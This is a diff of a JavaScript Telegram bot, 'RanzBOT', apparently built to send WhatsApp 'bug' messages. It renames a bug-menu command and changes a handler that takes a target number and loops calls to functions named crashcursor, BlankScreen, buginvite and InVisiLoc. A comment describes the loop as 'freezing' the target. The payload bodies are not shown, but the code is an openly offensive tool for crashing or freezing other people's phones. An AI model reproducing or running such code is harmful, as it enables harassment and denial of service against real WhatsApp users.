@@ -451,7 +451,7 @@ Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Memban
 ╭──(     \`ʙᴜɢᴍᴇɴᴜ\`     )
 │
 ㅒ
-│ /xcbeta
+│ /xcranz
 │ /maxpower
 ㅒ
 │
@@ -1441,7 +1441,7 @@ const QBug = {
     }
   }
 };
-bot.command("xcbeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
+bot.command("xranz", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
@@ -1459,11 +1459,8 @@ bot.command("xcbeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => 
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 20; i++) {
-        await crashcursor(target, { ptcp: true });
-        await BlankScreen(target, { ptcp: true });
-        await buginvite(target, { ptcp: true });
-        await crashcursor(target, { ptcp: true });
+  for (let i = 0; i < 3; i++) {
+        await InVisiLoc(target, { ptcp: true });
   }
 
   // Menyelesaikan proses response
